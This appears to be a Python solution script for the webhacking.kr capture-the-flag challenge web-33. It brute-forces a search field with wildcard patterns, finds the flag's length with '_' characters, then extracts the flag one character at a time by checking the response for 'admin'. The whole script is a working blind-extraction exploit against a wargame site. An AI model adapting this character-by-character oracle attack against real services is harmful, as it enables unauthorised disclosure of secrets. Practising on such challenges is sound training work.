from requests import *
s=session()
key='admin'
leng=5
m='FLAG{'
for i in range(32,128):
    url='https://webhacking.kr/challenge/web-33/index.php'
    i=chr(i)
    data={'search':f'{i}'}
    response=s.post(url=url,data=data)
    if response.text.find(key) != -1:
        if i == '%':
            continue
        print(i,end='')
print('\n')
for i in range(100):
    url='https://webhacking.kr/challenge/web-33/index.php'
    k=m+'_'
    data={'search':f'{k}'}
    response=s.post(url=url,data=data)
    if response.text.find(key) != -1:
        m+='_'
        leng+=1
    else:
        break
print('flag length is :',leng)
m='FLAG{'
for i in range(6,leng+1):
    for j in range(38,128):
        url='https://webhacking.kr/challenge/web-33/index.php'
        j=chr(j)
        k=m+j
        data={'search':f'{k}'}
        response=s.post(url=url,data=data)
        if response.text.find(key) != -1:
            m+=j
            print(m)
            break    